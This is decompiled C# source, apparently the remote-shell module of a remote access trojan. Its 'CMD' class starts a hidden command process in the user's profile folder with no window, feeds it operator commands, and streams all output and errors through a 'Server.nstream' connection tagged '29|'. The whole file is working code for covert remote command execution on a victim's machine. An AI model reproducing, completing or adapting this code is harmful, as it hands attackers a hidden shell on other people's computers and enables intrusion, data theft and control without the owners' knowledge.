using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000009 RID: 9
[StandardModule]
internal sealed class CMD
{
	// Token: 0x0600007D RID: 125 RVA: 0x00009698 File Offset: 0x00007898
	public static void Start(object app)
	{
		CMD._inputWriter = null;
		CMD.newt = new Thread(new ParameterizedThreadStart(CMD.Initialize));
		CMD.newt.SetApartmentState(ApartmentState.STA);
		CMD.newt.Start(RuntimeHelpers.GetObjectValue(app));
	}

	// Token: 0x0600007E RID: 126 RVA: 0x000096D4 File Offset: 0x000078D4
	public static void Close()
	{
		try
		{
			CMD._prc.Kill();
			CMD.newt.Abort();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600007F RID: 127 RVA: 0x00009714 File Offset: 0x00007914
	public static void Write(string command)
	{
		if (CMD._inputWriter == null)
		{
			CMD._inputWriter = new StreamWriter(CMD._prc.StandardInput.BaseStream);
		}
		CMD._inputWriter.WriteLine(command);
		CMD._inputWriter.Flush();
	}

	// Token: 0x06000080 RID: 128 RVA: 0x0000974C File Offset: 0x0000794C
	private static void Initialize(object app)
	{
		CMD._encoding = Encoding.ASCII;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(Conversions.ToString(app));
		processStartInfo.UseShellExecute = false;
		processStartInfo.RedirectStandardInput = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.StandardOutputEncoding = CMD._encoding;
		processStartInfo.StandardErrorEncoding = CMD._encoding;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WorkingDirectory = Interaction.Environ("UserProfile");
		CMD._prc = new Process();
		CMD._prc.StartInfo = processStartInfo;
		CMD._prc.Start();
		CMD.RedirectOutputs();
	}

	// Token: 0x06000081 RID: 129 RVA: 0x000097E0 File Offset: 0x000079E0
	private static void RedirectOutputs()
	{
		ThreadPool.QueueUserWorkItem(new WaitCallback(CMD.RedirectStandardOutput));
		ThreadPool.QueueUserWorkItem(new WaitCallback(CMD.RedirectStandardError));
	}

	// Token: 0x06000082 RID: 130 RVA: 0x00009808 File Offset: 0x00007A08
	private static void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
	{
		object readStreamLock = CMD._readStreamLock;
		ObjectFlowControl.CheckForSyncLockOnValueType(readStreamLock);
		lock (readStreamLock)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(Strings.ChrW(firstCharRead));
			while (streamReader.Peek() > -1)
			{
				int charCode = streamReader.Read();
				stringBuilder.Append(Strings.ChrW(charCode));
				if (streamReader.Peek() == 0)
				{
					CMD.SendAndFlushBuffer(stringBuilder, isError);
				}
			}
			CMD.SendAndFlushBuffer(stringBuilder, isError);
		}
	}

	// Token: 0x06000083 RID: 131 RVA: 0x00009890 File Offset: 0x00007A90
	private static void SendAndFlushBuffer(StringBuilder s, bool e)
	{
		string str = s.ToString();
		Functions.uploadserialized(Server.nstream, "29|" + str);
	}

	// Token: 0x06000084 RID: 132 RVA: 0x000098BC File Offset: 0x00007ABC
	private static void RedirectStandardOutput(object stupid)
	{
		try
		{
			int firstCharRead;
			while (CMD._prc != null && !CMD._prc.HasExited && CMD.CSharpImpl.__Assign<int>(ref firstCharRead, CMD._prc.StandardOutput.Read()) > -1)
			{
				CMD.ReadStream(firstCharRead, CMD._prc.StandardOutput, false);
			}
			object readLock = CMD._readLock;
			ObjectFlowControl.CheckForSyncLockOnValueType(readLock);
			lock (readLock)
			{
				if (CMD._read)
				{
					CMD._read = false;
					throw new ApplicationException("session unexpectedly closed");
				}
			}
		}
		catch (ObjectDisposedException ex)
		{
		}
		catch (Exception ex2)
		{
			if (!(ex2 is ApplicationException))
			{
				InvalidOperationException ex3 = ex2 as InvalidOperationException;
			}
		}
	}

	// Token: 0x06000085 RID: 133 RVA: 0x0000999C File Offset: 0x00007B9C
	private static void RedirectStandardError(object stupid)
	{
		try
		{
			int firstCharRead;
			while (CMD._prc != null && !CMD._prc.HasExited && CMD.CSharpImpl.__Assign<int>(ref firstCharRead, CMD._prc.StandardError.Read()) > -1)
			{
				CMD.ReadStream(firstCharRead, CMD._prc.StandardError, true);
			}
			object readLock = CMD._readLock;
			ObjectFlowControl.CheckForSyncLockOnValueType(readLock);
			lock (readLock)
			{
				if (CMD._read)
				{
					CMD._read = false;
					throw new ApplicationException("session unexpectedly closed");
				}
			}
		}
		catch (ObjectDisposedException ex)
		{
		}
		catch (Exception ex2)
		{
			if (!(ex2 is ApplicationException))
			{
				InvalidOperationException ex3 = ex2 as InvalidOperationException;
			}
		}
	}

	// Token: 0x0400002B RID: 43
	private static Process _prc;

	// Token: 0x0400002C RID: 44
	private static readonly object _readStreamLock = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x0400002D RID: 45
	private static readonly object _readLock = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x0400002E RID: 46
	private static StreamWriter _inputWriter;

	// Token: 0x0400002F RID: 47
	private static bool _read;

	// Token: 0x04000030 RID: 48
	private static Encoding _encoding;

	// Token: 0x04000031 RID: 49
	private static Thread newt;

	// Token: 0x0200001C RID: 28
	private class CSharpImpl
	{
		// Token: 0x060000EA RID: 234 RVA: 0x00009A84 File Offset: 0x00007C84
		[Obsolete("Please refactor calling code to use normal Visual Basic assignment")]
		public static T __Assign<T>(ref T target, T value)
		{
			target = value;
			return value;
		}
	}
}
